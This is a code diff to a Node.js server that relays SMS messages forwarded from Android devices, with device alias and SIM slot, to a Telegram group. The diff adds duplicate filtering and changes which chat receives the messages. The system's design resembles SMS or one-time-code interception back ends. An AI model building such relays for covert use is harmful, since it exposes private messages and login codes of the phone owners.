@@ -12,6 +12,7 @@ const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL || process.env.URL |
 const FIREBASE_DATABASE_URL = process.env.FIREBASE_DATABASE_URL || 'https://sms-tracker-6eeed-default-rtdb.asia-southeast1.firebasedatabase.app';
 
 const DEVICES_FILE = path.join(__dirname, 'devices.json');
+const DEDUP_FILE = path.join(__dirname, 'dedup_sms.json');
 
 const app = express();
 app.use(express.json());
@@ -20,6 +21,38 @@ app.use(express.urlencoded({ extended: true }));
 // In-Memory Device Storage: deviceId -> object
 const devices = new Map();
 let currentGroupChatId = GROUP_CHAT_ID;
+
+// Deduplication Cache: hash -> timestamp
+const processedSmsMap = new Map();
+
+function loadDedup() {
+  try {
+    if (fs.existsSync(DEDUP_FILE)) {
+      const data = JSON.parse(fs.readFileSync(DEDUP_FILE, 'utf8'));
+      Object.keys(data).forEach(k => processedSmsMap.set(k, data[k]));
+      console.log(`[Deduplication] Loaded ${processedSmsMap.size} processed SMS records`);
+    }
+  } catch (e) {
+    console.error('[Deduplication Load Error]:', e.message);
+  }
+}
+
+function saveDedup() {
+  try {
+    const entries = Array.from(processedSmsMap.entries());
+    if (entries.length > 2000) {
+      entries.splice(0, entries.length - 2000);
+      processedSmsMap.clear();
+      entries.forEach(([k, v]) => processedSmsMap.set(k, v));
+    }
+    const obj = Object.fromEntries(processedSmsMap);
+    fs.writeFileSync(DEDUP_FILE, JSON.stringify(obj), 'utf8');
+  } catch (e) {
+    console.error('[Deduplication Save Error]:', e.message);
+  }
+}
+
+loadDedup();
 
 // File Persistence
 function loadDevices() {
@@ -336,14 +369,45 @@ app.post('/api/forward-sms', async (req, res) => {
     });
   }
 
+  const cleanSender = (sender || '').trim();
+  const cleanBody = (body || '').trim().replace(/\s+/g, ' ');
+  const timeNum = timestamp ? Math.floor(new Date(timestamp).getTime() / 1000) : 0;
+
+  // Deduplication Fingerprints
+  const exactKey = `${cleanSender.toLowerCase()}:::${cleanBody}:::${timeNum}`;
+  const contentKey = `${cleanSender.toLowerCase()}:::${cleanBody}`;
+  const now = Date.now();
+
+  // 1. Filter exact duplicate SMS
+  if (processedSmsMap.has(exactKey)) {
+    console.log(`[Deduplication] Dropping exact duplicate SMS from ${cleanSender}: "${cleanBody.substring(0, 30)}..."`);
+    return res.json({ success: true, duplicate: true, message: 'Exact duplicate SMS skipped' });
+  }
+
+  // 2. Filter repeated identical content within 10 minutes
+  const lastSentTime = processedSmsMap.get(contentKey);
+  if (lastSentTime && (now - lastSentTime) < 10 * 60 * 1000) {
+    console.log(`[Deduplication] Dropping repeated SMS from ${cleanSender} (sent ${Math.floor((now - lastSentTime)/1000)}s ago)`);
+    return res.json({ success: true, duplicate: true, message: 'Repeated SMS within 10m skipped' });
+  }
+
+  // Register in deduplication map and persist
+  processedSmsMap.set(exactKey, now);
+  processedSmsMap.set(contentKey, now);
+  saveDedup();
+
   const dev = devices.get(deviceId) || { deviceAlias: 'Android Device' };
   const timeStr = timestamp ? new Date(timestamp).toLocaleString() : new Date().toLocaleString();
 
   const formattedMsg = `📩 *New SMS Received*\n\n📱 *Device:* \`${dev.deviceAlias}\`\n👤 *From:* \`${sender}\`\n💳 *SIM:* \`${simSlot || 'SIM 1'}\`\n⏰ *Time:* \`${timeStr}\`\n\n💬 *Message:*\n\`${body}\``;
 
+  // Send ONLY to Telegram Group if configured; fallback to Admin chat only if no group exists
   const targets = new Set();
-  if (ADMIN_CHAT_ID) targets.add(ADMIN_CHAT_ID);
-  if (currentGroupChatId) targets.add(currentGroupChatId);
+  if (currentGroupChatId) {
+    targets.add(currentGroupChatId);
+  } else if (ADMIN_CHAT_ID) {
+    targets.add(ADMIN_CHAT_ID);
+  }
 
   try {
     for (const targetId of targets) {
